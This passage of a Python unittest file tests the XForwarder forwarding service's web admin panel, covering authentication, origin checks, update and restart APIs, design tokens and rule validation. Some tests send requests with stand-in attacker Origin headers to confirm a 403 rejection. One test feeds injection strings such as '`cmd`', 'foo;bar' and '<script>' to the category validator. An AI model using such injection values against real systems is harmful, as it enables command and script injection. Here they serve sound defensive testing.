        self.assertEqual(classify("healthy", 0, 149.0), "latency-good")

        # Elevated latency (>150ms, 0% loss) -> warning amber
        self.assertEqual(classify("healthy", 0, 151.0), "latency-medium")

        # High latency (>250ms) -> bad rose
        self.assertEqual(classify("healthy", 0, 260.0), "latency-bad")

        # Minor packet loss (>0% and <=25%) -> warning amber
        self.assertEqual(classify("healthy", 5, 50.0), "latency-medium")

        # Severe packet loss (>25%) -> bad rose
        self.assertEqual(classify("healthy", 30, 50.0), "latency-bad")

        # Explicit down / failed status -> bad rose
        self.assertEqual(classify("failed", 100, 0), "latency-bad")
        self.assertEqual(classify("down", 100, 0), "latency-bad")

        # Degraded status -> bad rose
        self.assertEqual(classify("degraded", 10, 40.0), "latency-bad")

    def test_nova_admin_design_system_and_login_cleanup(self):
        """Verifies Nova Admin Template v3 design tokens, Aurora lighting layer, and clean login card."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # 1. Typography & Google Fonts (Space Grotesk display font)
        self.assertIn("family=Space+Grotesk", html, "index.html must load Space Grotesk font")
        self.assertIn("--font-display: 'Space Grotesk'", css, "CSS must define Space Grotesk as display font")
        self.assertIn("font-family: var(--font-display);", css, "Headings & stats must bind to font-display")

        # 2. Floating Aurora Ambient Lighting Layer
        self.assertIn('class="aurora"', html, "index.html must have .aurora background container")
        self.assertIn(".aurora {", css, "style.css must style .aurora")
        self.assertIn("pointer-events: none;", css, "Aurora must never intercept pointer events")
        self.assertIn("@keyframes float1", css, "Aurora must define float1 keyframe animation")
        self.assertIn("@media (prefers-reduced-motion: reduce)", css, "Must honor prefers-reduced-motion")

        # 3. Nova Signature Color Tokens (Dark & Light)
        # Dark Theme
        self.assertIn("--bg-base: #0B0E14;", css)
        self.assertIn("--bg-surface: #12151f;", css)
        self.assertIn("--mint: #6EE7B7;", css)
        self.assertIn("--violet: #A78BFA;", css)
        self.assertIn("--amber: #FBBF6B;", css)
        self.assertIn("--red: #FB7185;", css)
        self.assertIn("--blob-1: #22315c;", css)

        # Light Theme
        self.assertIn("--bg-base: #EEF1F7;", css)
        self.assertIn("--bg-surface: #FFFFFF;", css)
        self.assertIn("--blob-1: #c9dcfb;", css)

        # 4. Primary Button & Brand Logo Mint-to-Violet Gradients
        self.assertIn("linear-gradient(135deg, var(--accent-mint), var(--accent-violet))", css)
        self.assertIn(".btn-primary svg {", css)

        # 5. Absence of Login Security Badge (Eliminates Tech Stack Disclosure)
        self.assertNotIn("login-security-badge", html, "Login security badge must be removed from HTML")
        self.assertNotIn(".login-security-badge {", css, "Dead .login-security-badge CSS must be cleaned up")
        self.assertNotIn("PBKDF2-HMAC-SHA256 (100k iters)", html, "Tech stack banner must not leak on login screen")

        # 6. Core Login Screen Controls Remain Fully Intact
        self.assertIn('id="loginUsername"', html)
        self.assertIn('id="loginPassword"', html)
        self.assertIn('id="btnLogin"', html)
        self.assertIn('id="loginError"', html)
        self.assertIn('id="lockoutAlert"', html)
        self.assertIn('id="lockoutTimer"', html)

    def test_dark_and_light_theme_button_color_harmonization(self):
        """Verifies that buttons across dark and light themes enforce high contrast, readability, and harmonious styling."""
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # 1. Dark Mode Primary Button: royal violet gradient with crisp pure white text
        self.assertIn("linear-gradient(135deg, #7C3AED, #6366F1)", css)
        self.assertIn(".btn-primary svg {", css)
        self.assertIn(".btn-primary {\n    background: linear-gradient(135deg, #7C3AED, #6366F1);\n    color: #FFFFFF !important;", css)

        # 2. Light Mode Primary Button: royal violet gradient with crisp pure white text
        self.assertIn('[data-theme="light"] .btn-primary {', css)
        self.assertIn("background: linear-gradient(135deg, #7C3AED, #6366F1);", css)
        self.assertIn('[data-theme="light"] .btn-primary svg {', css)

        # 3. Light Mode Secondary Button: solid white tactile card
        self.assertIn('[data-theme="light"] .btn-secondary {', css)
        self.assertIn("color: #1E293B;", css)

        # 4. Light Mode Danger Button: accessible crimson rose
        self.assertIn('[data-theme="light"] .btn-danger {', css)
        self.assertIn("color: #E11D48;", css)

        # 5. Light Mode Priority & Chips: deep legible violet
        self.assertIn('[data-theme="light"] .add-prio-btn {', css)
        self.assertIn('[data-theme="light"] .preset-chip {', css)
        self.assertIn('[data-theme="light"] .btn-path-test {', css)
        self.assertIn('[data-theme="light"] .prio-tag-1 {', css)

        # 6. Light Mode Brand & Avatar Elements: crisp white glyphs on royal violet gradient
        self.assertIn('[data-theme="light"] .logo-orb {', css)
        self.assertIn('[data-theme="light"] .logo-orb svg {', css)
        self.assertIn('[data-theme="light"] .brand-badge {', css)
        self.assertIn('[data-theme="light"] .user-avatar {', css)
        self.assertIn('[data-theme="light"] .user-avatar svg {', css)
        self.assertIn('[data-theme="light"] .sidebar-user {', css)
        self.assertIn('.user-meta .user-role {', css)
        self.assertIn("-webkit-font-smoothing: antialiased;", css)

    def test_system_version_and_update_apis(self):
        """Verifies GET /api/system/version, GET /api/system/update/status, and POST /api/system/update."""
        cfg = load_config()
        secret = str(cfg.get("web", {}).get("secret_path", "")).strip().strip("/")
        secret_prefix = f"/{secret}" if secret else ""

        server = HTTPServer(("127.0.0.1", 0), XForwarderWebHandler)
        port = server.server_port
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()

        token = "test_update_session_token"
        with SESSION_LOCK:
            ACTIVE_SESSIONS[token] = {
                "username": "admin",
                "created_at": time.time(),
                "last_active": time.time(),
                "expires_at": time.time() + 3600
            }

        try:
            # 1. Unauthenticated GET /api/system/version -> 401
            req_unauth_v = urllib.request.Request(f"http://127.0.0.1:{port}{secret_prefix}/api/system/version")
            try:
                urllib.request.urlopen(req_unauth_v, timeout=3.0)
                self.fail("Expected 401 HTTPError")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 401)

            # 2. Authenticated GET /api/system/version -> 200
            req_auth_v = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/system/version",
                headers={"Cookie": f"xfwd_session={token}"}
            )
            with patch("core.web_server.get_remote_version_info", return_value={"commit": "abc1234", "date": "2026-10-22", "error": None}):
                with urllib.request.urlopen(req_auth_v, timeout=5.0) as resp:
                    self.assertEqual(resp.status, 200)
                    body = json.loads(resp.read().decode("utf-8"))
                    self.assertTrue(body.get("ok"))
                    self.assertIn("current_version", body)
                    self.assertIn("update_available", body)
                    self.assertIn("repo_url", body)

            # 3. Unauthenticated GET /api/system/update/status -> 401
            req_unauth_s = urllib.request.Request(f"http://127.0.0.1:{port}{secret_prefix}/api/system/update/status")
            try:
                urllib.request.urlopen(req_unauth_s, timeout=3.0)
                self.fail("Expected 401 HTTPError")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 401)

            # 4. Authenticated GET /api/system/update/status -> 200
            req_auth_s = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/system/update/status",
                headers={"Cookie": f"xfwd_session={token}"}
            )
            with urllib.request.urlopen(req_auth_s, timeout=3.0) as resp:
                self.assertEqual(resp.status, 200)
                body_s = json.loads(resp.read().decode("utf-8"))
                self.assertTrue(body_s.get("ok"))
                self.assertIn("status", body_s)
                self.assertIn("log", body_s)

            # 5. Unauthenticated POST /api/system/update -> 401
            req_unauth_up = urllib.request.Request(
                f"http://127.0.0.1:{port}{secret_prefix}/api/system/update",
                data=b"{}",
                headers={"Content-Type": "application/json"}
            )
            try:
                urllib.request.urlopen(req_unauth_up, timeout=3.0)
                self.fail("Expected 401 HTTPError")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 401)

            # 6. Authenticated POST /api/system/update with invalid Origin -> 403
            req_no_origin = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/system/update",
                data=b"{}",
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": "http://attacker-site.com"
                }
            )
            try:
                urllib.request.urlopen(req_no_origin, timeout=3.0)
                self.fail("Expected 403 HTTPError")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 403)

            # 7. Authenticated POST /api/system/update with Origin -> 200 started
            req_valid_up = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/system/update",
                data=b"{}",
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": f"http://127.0.0.1:{port}"
                }
            )
            with urllib.request.urlopen(req_valid_up, timeout=5.0) as resp:
                self.assertEqual(resp.status, 200)
                body_up = json.loads(resp.read().decode("utf-8"))
                self.assertTrue(body_up.get("ok"))
                self.assertEqual(body_up.get("status"), "started")

        finally:
            with SESSION_LOCK:
                ACTIVE_SESSIONS.pop(token, None)
            with _UPDATE_LOCK:
                _UPDATE_STATE["status"] = "idle"
                _UPDATE_STATE["start_time"] = 0
            server.shutdown()
            server.server_close()

    def test_system_update_dom_and_ui_wiring(self):
        """Verifies that System Update UI elements exist across HTML, JavaScript, and CSS."""
        web_dir = os.path.join(REPO_ROOT, "web")
        with open(os.path.join(web_dir, "index.html"), "r", encoding="utf-8") as f:
            html = f.read()
        with open(os.path.join(web_dir, "app.js"), "r", encoding="utf-8") as f:
            js = f.read()
        with open(os.path.join(web_dir, "style.css"), "r", encoding="utf-8") as f:
            css = f.read()

        # HTML elements
        for elem_id in (
            "cardSystemUpdate",
            "valInstalledVersion",
            "valLocalCommit",
            "valRemoteCommit",
            "valLastChecked",
            "badgeUpdateStatus",
            "btnCheckUpdates",
            "btnTriggerUpdate",
            "updateStatusNotice",
            "updateModal",
            "updateConfirmView",
            "updateProgressView",
            "updateStatusBanner",
            "updateSpinner",
            "updateConsole",
            "btnConfirmStartUpdate",
            "btnCloseUpdateModal",
            "btnCancelUpdateModal"
        ):
            self.assertIn(f'id="{elem_id}"', html, f"Missing element ID: {elem_id}")

        # JS functions & logic
        for fn_name in (
            "initSystemUpdateManager",
            "fetchSystemVersionInfo",
            "openSystemUpdateModal",
            "closeSystemUpdateModal",
            "startSystemUpdateProcedure",
            "pollUpdateProgress"
        ):
            self.assertIn(fn_name, js, f"Missing JS function: {fn_name}")

        # CSS classes & variables
        self.assertIn(".badge-amber", css)
        self.assertIn(".update-notice", css)
        self.assertIn("#updateConsole", css)
        self.assertIn(".pulse-glow", css)

    def test_get_update_status_parsing_and_ansi_cleaning(self):
        """Verifies get_update_status parses completed state and strips ANSI codes."""
        tmp_log = os.path.join(tempfile.gettempdir(), f"xfwd_test_update_{int(time.time())}.log")
        with open(tmp_log, "w", encoding="utf-8") as f:
            f.write("\x1b[32m[OK]\x1b[0m XForwarder updated successfully! All services are active and running.\n")

        with patch("core.web_server.get_update_log_path", return_value=tmp_log):
            status = get_update_status()
            self.assertTrue(status["ok"])
            self.assertEqual(status["status"], "completed")
            self.assertNotIn("\x1b[", status["log"])
            self.assertIn("XForwarder updated successfully!", status["log"])

        try:
            os.remove(tmp_log)
        except Exception:
            pass

    def test_restart_services_action_logic(self):
        """Verifies restart_services_action behavior across supported services and edge cases."""
        # 1. Invalid service name rejected
        ok, msg, recon = restart_services_action("unknown_invalid_service")
        self.assertFalse(ok)
        self.assertIn("Invalid service identifier", msg)
        self.assertFalse(recon)

        # 2. None or empty string defaults to 'all'
        ok, msg, recon = restart_services_action("")
        self.assertTrue(ok)
        self.assertTrue(recon)

        # 3. Individual services in mock/fallback mode
        for svc in ("engine", "haproxy", "nginx", "nftables"):
            ok, msg, recon = restart_services_action(svc)
            self.assertTrue(ok, f"Failed for {svc}: {msg}")
            self.assertFalse(recon)

        # 4. Web service returns reconnecting flag
        ok, msg, recon = restart_services_action("web")
        self.assertTrue(ok)
        self.assertTrue(recon)

        # 5. Linux environment with systemctl mocked
        with patch("shutil.which", return_value="/bin/systemctl"), \
             patch("sys.platform", "linux"), \
             patch("subprocess.run") as mock_sub:
            mock_sub.return_value = MagicMock(returncode=0, stdout="success", stderr="")

            # Test HAProxy
            ok, msg, recon = restart_services_action("haproxy")
            self.assertTrue(ok)
            self.assertFalse(recon)
            mock_sub.assert_called_with(["systemctl", "reload", "haproxy"], capture_output=True, text=True, timeout=8.0)

            # Test Engine
            mock_sub.reset_mock()
            ok, msg, recon = restart_services_action("engine")
            self.assertTrue(ok)
            self.assertFalse(recon)
            mock_sub.assert_any_call(["systemctl", "restart", "xforwarder.service"], capture_output=True, text=True, timeout=10.0)

    def test_service_restart_api_endpoints(self):
        """Verifies POST /api/services/restart authentication, origin security, and payload handling."""
        cfg = load_config()
        secret = str(cfg.get("web", {}).get("secret_path", "")).strip().strip("/")
        secret_prefix = f"/{secret}" if secret else ""

        server = HTTPServer(("127.0.0.1", 0), XForwarderWebHandler)
        port = server.server_port
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()

        token = "test_restart_token_9999"
        with SESSION_LOCK:
            ACTIVE_SESSIONS[token] = {
                "username": "admin",
                "created_at": time.time(),
                "last_active": time.time(),
                "expires_at": time.time() + 3600,
                "ip": "127.0.0.1"
            }

        try:
            # 1. Unauthenticated request -> 401
            req_unauth = urllib.request.Request(
                f"http://127.0.0.1:{port}{secret_prefix}/api/services/restart",
                data=b'{"service":"engine"}',
                headers={"Content-Type": "application/json"}
            )
            try:
                urllib.request.urlopen(req_unauth, timeout=3.0)
                self.fail("Expected 401 Unauthorized")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 401)

            # 2. Authenticated request with mismatched Origin -> 403 Forbidden
            req_bad_origin = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/services/restart",
                data=b'{"service":"engine"}',
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": "http://evil-attacker.com"
                }
            )
            try:
                urllib.request.urlopen(req_bad_origin, timeout=3.0)
                self.fail("Expected 403 Forbidden")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 403)

            # 3. Authenticated request with invalid service -> 400 Bad Request
            req_invalid = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/services/restart",
                data=b'{"service":"nonexistent_service"}',
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": f"http://127.0.0.1:{port}"
                }
            )
            try:
                urllib.request.urlopen(req_invalid, timeout=3.0)
                self.fail("Expected 400 Bad Request")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 400)
                err_data = json.loads(err.read().decode("utf-8"))
                self.assertFalse(err_data.get("ok"))
                self.assertIn("Invalid service identifier", err_data.get("error", ""))

            # 4. Authenticated request with valid service (engine) -> 200 OK
            req_valid_engine = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/services/restart",
                data=b'{"service":"engine"}',
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": f"http://127.0.0.1:{port}"
                }
            )
            with urllib.request.urlopen(req_valid_engine, timeout=3.0) as resp:
                self.assertEqual(resp.status, 200)
                resp_data = json.loads(resp.read().decode("utf-8"))
                self.assertTrue(resp_data.get("ok"))
                self.assertEqual(resp_data.get("service"), "engine")
                self.assertFalse(resp_data.get("reconnecting"))

            # 5. Authenticated request with 'all' -> 200 OK with reconnecting=True
            req_valid_all = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/services/restart",
                data=b'{"service":"all"}',
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": f"http://127.0.0.1:{port}"
                }
            )
            with urllib.request.urlopen(req_valid_all, timeout=3.0) as resp:
                self.assertEqual(resp.status, 200)
                resp_data = json.loads(resp.read().decode("utf-8"))
                self.assertTrue(resp_data.get("ok"))
                self.assertEqual(resp_data.get("service"), "all")
                self.assertTrue(resp_data.get("reconnecting"))

        finally:
            with SESSION_LOCK:
                ACTIVE_SESSIONS.pop(token, None)
            server.shutdown()
            server.server_close()

    def test_service_restart_dom_and_ui_wiring(self):
        """Verifies that Service Restart buttons and JS controllers exist."""
        web_dir = os.path.join(REPO_ROOT, "web")
        with open(os.path.join(web_dir, "index.html"), "r", encoding="utf-8") as f:
            html = f.read()
        with open(os.path.join(web_dir, "app.js"), "r", encoding="utf-8") as f:
            js = f.read()

        # HTML Button IDs
        for btn_id in (
            "btnRestartCoreEngine",
            "btnRestartAllServices",
            "btnReloadHaproxy",
            "btnResyncNftables",
            "btnReloadNginx",
        ):
            self.assertIn(f'id="{btn_id}"', html, f"Missing restart button: {btn_id}")

        # JS functions
        for fn_name in (
            "initServiceRestartControls",
            "handleServiceRestart",
            "pollDashboardReconnection"
        ):
            self.assertIn(fn_name, js, f"Missing JS function: {fn_name}")

    def test_session_and_update_state_disk_persistence(self):
        """Verifies session and update state persistence across daemon reloads."""
        tmp_sessions = os.path.join(tempfile.gettempdir(), f"xfwd_test_sess_{int(time.time())}.json")
        tmp_update = os.path.join(tempfile.gettempdir(), f"xfwd_test_upstate_{int(time.time())}.json")

        with patch("core.web_server.get_sessions_file_path", return_value=tmp_sessions), \
             patch("core.web_server.get_update_state_file_path", return_value=tmp_update):

            # 1. Test Session persistence
            test_tok = "tok_persist_12345"
            with SESSION_LOCK:
                ACTIVE_SESSIONS[test_tok] = {
                    "username": "admin_persist",
                    "created_at": time.time(),
                    "last_active": time.time(),
                    "expires_at": time.time() + 3600,
                    "ip": "127.0.0.1"
                }
            save_sessions_to_disk()
            self.assertTrue(os.path.isfile(tmp_sessions))

            # Simulate daemon reload: clear in-memory and reload from disk
            with SESSION_LOCK:
                ACTIVE_SESSIONS.clear()
            self.assertNotIn(test_tok, ACTIVE_SESSIONS)

            load_sessions_from_disk()
            self.assertIn(test_tok, ACTIVE_SESSIONS)
            self.assertEqual(ACTIVE_SESSIONS[test_tok]["username"], "admin_persist")

            # 2. Test Update State persistence
            state_data = {
                "status": "running",
                "start_time": time.time(),
                "pid": 9876,
                "error": None
            }
            save_update_state(state_data)
            self.assertTrue(os.path.isfile(tmp_update))

            with _UPDATE_LOCK:
                _UPDATE_STATE["status"] = "idle"
                _UPDATE_STATE["start_time"] = 0

            load_update_state()
            with _UPDATE_LOCK:
                self.assertEqual(_UPDATE_STATE["status"], "running")
                self.assertEqual(_UPDATE_STATE["pid"], 9876)

        # Cleanup
        try:
            os.remove(tmp_sessions)
        except Exception:
            pass
        try:
            os.remove(tmp_update)
        except Exception:
            pass
        with SESSION_LOCK:
            ACTIVE_SESSIONS.pop(test_tok, None)
        with _UPDATE_LOCK:
            _UPDATE_STATE["status"] = "idle"
            _UPDATE_STATE["start_time"] = 0

    def test_version_detection_with_commit_file_and_fallback(self):
        """Verifies local version info parses .commit files and detects updates when remote differs."""
        tmp_commit = os.path.join(tempfile.gettempdir(), f"xfwd_test_commit_{int(time.time())}.commit")
        tmp_date = tmp_commit.replace(".commit", ".commit_date")

        with open(tmp_commit, "w", encoding="utf-8") as f:
            f.write("abc1234\n")
        with open(tmp_date, "w", encoding="utf-8") as f:
            f.write("2026-10-22\n")

        with patch("core.web_server.get_local_version_info") as mock_loc:
            # 1. When local matches remote -> update_available is False
            mock_loc.return_value = {
                "version": "1.3.1",
                "commit": "abc1234",
                "commit_date": "2026-10-22",
                "is_git": False
            }
            with patch("core.web_server.get_remote_version_info", return_value={"remote_commit": "abc1234", "remote_date": "2026-10-22", "error": None}):
                status = get_full_version_status(force=True)
                self.assertFalse(status["update_available"])
                self.assertEqual(status["current_commit"], "abc1234")

            # 2. When remote has newer commit -> update_available is True
            with patch("core.web_server.get_remote_version_info", return_value={"remote_commit": "def5678", "remote_date": "2026-10-22", "error": None}):
                status = get_full_version_status(force=True)
                self.assertTrue(status["update_available"])

            # 3. When local commit is unrecorded (None) -> update_available is True so user can sync
            mock_loc.return_value = {
                "version": "1.3.1",
                "commit": None,
                "commit_date": None,
                "is_git": False
            }
            with patch("core.web_server.get_remote_version_info", return_value={"remote_commit": "def5678", "remote_date": "2026-10-22", "error": None}):
                status = get_full_version_status(force=True)
                self.assertTrue(status["update_available"])

        try:
            os.remove(tmp_commit)
            os.remove(tmp_date)
        except Exception:
            pass

    def test_get_remote_version_info_rate_limit_fallback(self):
        """Verifies get_remote_version_info gracefully falls back to git ls-remote when GitHub REST API hits HTTP 403 rate limit."""
        import urllib.error
        from unittest.mock import MagicMock
        from core.web_server import get_remote_version_info

        # 1. Simulate GitHub REST API 403 Rate Limit, with git ls-remote available
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "bd4de5159c030e3f6e08b8a342f06087851cb3f6\trefs/heads/main\n"

        with patch("urllib.request.urlopen", side_effect=urllib.error.HTTPError("https://api.github.com", 403, "rate limit exceeded", {}, None)):
            with patch("subprocess.run", return_value=mock_proc) as mock_sub:
                info = get_remote_version_info(force=True)
                self.assertEqual(info["remote_commit"], "bd4de51")
                self.assertIsNone(info["error"])
                mock_sub.assert_called_once()
                self.assertIn("git", mock_sub.call_args[0][0])
                self.assertIn("ls-remote", mock_sub.call_args[0][0])

        # 2. Simulate both REST API and git failing
        with patch("urllib.request.urlopen", side_effect=Exception("HTTP Error 403: rate limit exceeded")):
            with patch("subprocess.run", side_effect=FileNotFoundError("git not found")):
                info_failed = get_remote_version_info(force=True)
                self.assertIsNone(info_failed["remote_commit"])
                self.assertIsNotNone(info_failed["error"])
                self.assertIn("403", info_failed["error"])

    def test_rule_category_and_created_at_validation(self):
        """Verifies validate_rule properly accepts, sanitizes, and rejects rule categories and created_at timestamps."""
        # 1. Category defaults to "" if missing
        rule_no_cat = {
            "port": 8443,
            "protocol": "tcp",
            "destinations": [{"target": "1.1.1.1"}]
        }
        valid, msg = validate_rule(rule_no_cat)
        self.assertTrue(valid, msg)
        self.assertEqual(rule_no_cat["category"], "")
        self.assertIsInstance(rule_no_cat["created_at"], float)

        # 2. Valid trimmed category
        rule_valid_cat = {
            "port": 8444,
            "protocol": "tcp",
            "category": "  VIP-Gaming Tunnels  ",
            "destinations": [{"target": "1.1.1.1"}]
        }
        valid, msg = validate_rule(rule_valid_cat)
        self.assertTrue(valid, msg)
        self.assertEqual(rule_valid_cat["category"], "VIP-Gaming Tunnels")

        # 3. Category exceeding 48 characters is rejected
        rule_too_long = {
            "port": 8445,
            "protocol": "tcp",
            "category": "A" * 49,
            "destinations": [{"target": "1.1.1.1"}]
        }
        valid, msg = validate_rule(rule_too_long)
        self.assertFalse(valid)
        self.assertIn("exceed 48 characters", msg)

        # 4. Dangerous injection characters, control chars, and backslashes in category are rejected
        for bad_char in ['<script>', '"quoted"', "foo;bar", "val$var", "`cmd`", "path\\name", "line\nbreak", "tab\tchar"]:
            rule_bad = {
                "port": 8446,
                "protocol": "tcp",
                "category": f"Cat {bad_char}",
                "destinations": [{"target": "1.1.1.1"}]
            }
            valid, msg = validate_rule(rule_bad)
            self.assertFalse(valid, f"Expected reject for bad character '{bad_char}'")
            self.assertIn("invalid characters", msg)

        # 5. Invalid created_at (string, NaN, Inf, negative, or future bound) is sanitized to 0.0
        for bad_ts in ["invalid_date", "nan", "inf", "-inf", -500.0, 99999999999.0]:
            rule_bad_ts = {
                "port": 8447,
                "protocol": "tcp",
                "created_at": bad_ts,
                "destinations": [{"target": "1.1.1.1"}]
            }
            valid, msg = validate_rule(rule_bad_ts)
            self.assertTrue(valid, msg)
            self.assertIsInstance(rule_bad_ts["created_at"], float)
            self.assertEqual(rule_bad_ts["created_at"], 0.0, f"Expected 0.0 for bad timestamp {bad_ts}")

    def test_rules_view_toggle_and_category_assets(self):
        """Verifies presence and integrity of view toggle buttons, sort dropdown, and category DOM/CSS."""
        web_dir = os.path.join(REPO_ROOT, "web")
        with open(os.path.join(web_dir, "index.html"), "r", encoding="utf-8") as f:
            html = f.read()
        with open(os.path.join(web_dir, "style.css"), "r", encoding="utf-8") as f:
            css = f.read()
        with open(os.path.join(web_dir, "app.js"), "r", encoding="utf-8") as f:
            js = f.read()

        # HTML elements
        self.assertIn('id="selectSortRules"', html)
        self.assertIn('id="btnViewCards"', html)
        self.assertIn('id="btnViewList"', html)
        self.assertIn('id="formCategory"', html)
        self.assertIn('id="categoryDatalist"', html)

        # CSS classes
        self.assertIn('.view-toggle-group', css)
        self.assertIn('.view-toggle-btn', css)
        self.assertIn('.rule-category-section', css)
        self.assertIn('.rule-category-header', css)
        self.assertIn('.rule-category-line', css)
        self.assertIn('.rule-category-pill', css)
        self.assertIn('.rules-list-container', css)
        self.assertIn('.rule-list-row', css)

        # JS functions and state
        self.assertIn('xfwd_rules_view', js)
        self.assertIn('xfwd_rules_sort', js)
        self.assertIn('sortRulesList', js)
        self.assertIn('renderRuleCard', js)
        self.assertIn('renderRuleListRow', js)
        self.assertIn('updateCategoryDatalist', js)

    def test_rule_update_created_at_preservation(self):
        """Verifies that editing a rule preserves its original creation timestamp if omitted or updates it if provided."""
        existing_rules = [
            {
                "id": "rule-7777",
                "port": 7777,
                "protocol": "tcp",
                "category": "Gaming",
                "created_at": 1600000000.0,
                "destinations": [{"priority": 1, "type": "haproxy", "target": "2001:db8::1", "port": 7777}]
            }
        ]
        # Simulate updating rule without created_at passed in body
        updated_body = {
            "id": "rule-7777",
            "port": 7777,
            "protocol": "tcp",
            "category": "Gaming Pro",
            "created_at": 0.0,
            "destinations": [{"priority": 1, "type": "haproxy", "target": "2001:db8::1", "port": 7777}]
        }
        orig_created_at = float(existing_rules[0].get("created_at", 0) or 0)
        body_created_at = float(updated_body.get("created_at", 0) or 0)
        if orig_created_at > 0 and body_created_at <= 0:
            updated_body["created_at"] = orig_created_at
        self.assertEqual(updated_body["created_at"], 1600000000.0)

    def test_security_settings_responsive_layout_and_info_item_wrapping(self):
        """Verifies that Section 4 (Security & Settings) enforces a 2-column responsive layout,
        prevents text collisions via proper min-width and word-wrapping, and handles GitHub rate limits."""
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")

        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # 1. CSS Grid definitions for Settings
        self.assertIn("#sectionSecurity .overview-grid", css)
        self.assertIn(".settings-grid", css)
        self.assertIn("grid-template-columns: repeat(2, minmax(0, 1fr));", css)
        self.assertIn(".settings-btn-grid", css)

        # 2. info-item collision defense (no nowrap without flex shrink, guaranteed label min-width)
        self.assertIn(".info-label {", css)
        self.assertIn("min-width: 125px;", css)
        self.assertIn(".info-value {", css)
        self.assertIn("word-break: break-word;", css)
        self.assertIn("overflow-wrap: anywhere;", css)

        # 3. HTML usage of settings-grid and settings-btn-grid
        self.assertIn('class="overview-grid settings-grid"', html)
        self.assertIn('class="settings-btn-grid"', html)
        self.assertNotIn('style="grid-template-columns: 1fr 1fr;"', html, "Inline rigid button columns must be replaced with responsive settings-btn-grid")

        # 4. JS graceful handling of GitHub API rate limits
        self.assertIn("Rate Limited (GitHub API)", js)
        self.assertIn("rate limit", js)

    def test_topbar_extended_system_metrics_and_api(self):
        """Verifies get_system_stats returns load, sockets, and traffic metrics,
        and that topbar HTML/CSS/JS contains RAM %, System Load, Traffic (MB), and TCP/UDP sockets."""
        from core.web_server import get_system_stats

        # 1. API Output verification
        stats = get_system_stats()
        self.assertIn("ram_percent", stats)
        self.assertIn("cpu_percent", stats)
        self.assertIn("load_1", stats)
        self.assertIn("load_str", stats)
        self.assertIn("tcp_connections", stats)
        self.assertIn("udp_connections", stats)
        self.assertIn("net_rx_mb", stats)
        self.assertIn("net_tx_mb", stats)

        # 2. Mock /proc/loadavg, /proc/net/sockstat, and /proc/net/dev to verify accurate parsing
        sockstat_mock = (
            "sockets: used 256\n"
            "TCP: inuse 42 orphan 0 tw 5 alloc 50 mem 4\n"
            "UDP: inuse 13 mem 2\n"
        )
        netdev_mock = (
            "Inter-|   Receive                                                |  Transmit\n"
            " face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed\n"
            "    lo: 1000 10 0 0 0 0 0 0 1000 10 0 0 0 0 0 0\n"
            "  eth0: 104857600 1000 0 0 0 0 0 0 52428800 500 0 0 0 0 0 0\n"
        )
        loadavg_mock = "1.75 2.50 3.25 2/150 12345\n"

        def mock_open_proc(path, mode="r", **kwargs):
            import io
            if path == "/proc/loadavg":
                return io.StringIO(loadavg_mock)
            elif path == "/proc/net/sockstat":
                return io.StringIO(sockstat_mock)
            elif path == "/proc/net/dev":
                return io.StringIO(netdev_mock)
            return io.StringIO("")

        with patch("os.path.exists", side_effect=lambda p: p in ("/proc/loadavg", "/proc/net/sockstat", "/proc/net/dev")), \
             patch("builtins.open", side_effect=mock_open_proc):
            mocked_stats = get_system_stats()
            self.assertEqual(mocked_stats["load_1"], 1.75)
            self.assertEqual(mocked_stats["load_str"], "1.75")
            self.assertEqual(mocked_stats["tcp_connections"], 42)
            self.assertEqual(mocked_stats["udp_connections"], 13)
            self.assertEqual(mocked_stats["net_rx_mb"], 100.0)
            self.assertEqual(mocked_stats["net_tx_mb"], 50.0)
            self.assertEqual(mocked_stats["net_total_mb"], 150.0)
            self.assertIn("net_rx_rate_mb", mocked_stats)
            self.assertIn("net_tx_rate_mb", mocked_stats)

        # 3. HTML topbar pill elements
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()

        self.assertIn('id="ramPill"', html)
        self.assertIn('id="cpuPill"', html)
        self.assertIn('id="loadPill"', html)
        self.assertIn('id="trafficPill"', html)
        self.assertIn('id="connsPill"', html)
        self.assertIn('id="topbarActions"', html)
        self.assertIn('id="ovTrafficText"', html)
        self.assertIn("0.00 MB/s", html)

